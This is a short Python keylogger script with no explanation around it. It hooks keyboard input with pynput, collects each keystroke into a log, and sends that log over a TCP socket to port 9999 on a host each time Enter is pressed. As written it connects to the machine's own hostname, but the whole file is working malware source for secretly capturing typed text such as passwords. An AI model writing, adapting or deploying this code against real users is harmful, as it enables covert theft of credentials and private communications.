import os, socket

from pynput.keyboard import Key, Listener

#Create Socket and Connect
host = socket.gethostname()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,9999))


log = "\n"
#Read Keyboard input
def on_press(key):
    global log
    if key != Key.enter:
        if (str(key)).__contains__("Key."):
            if key == Key.space:
                log += " "
            else:
                if len(log) > 1:
                    log += "\n"
                    log += str(key).strip("'")
                else:
                    log += str(key).strip("'")
                    log += "\n"
        else:
            log += str(key).strip("'")
    else:
        s.sendall((log).encode('utf-8'))
        log = "\n"

with Listener(on_press=on_press) as listener :
    listener.join()
     
        
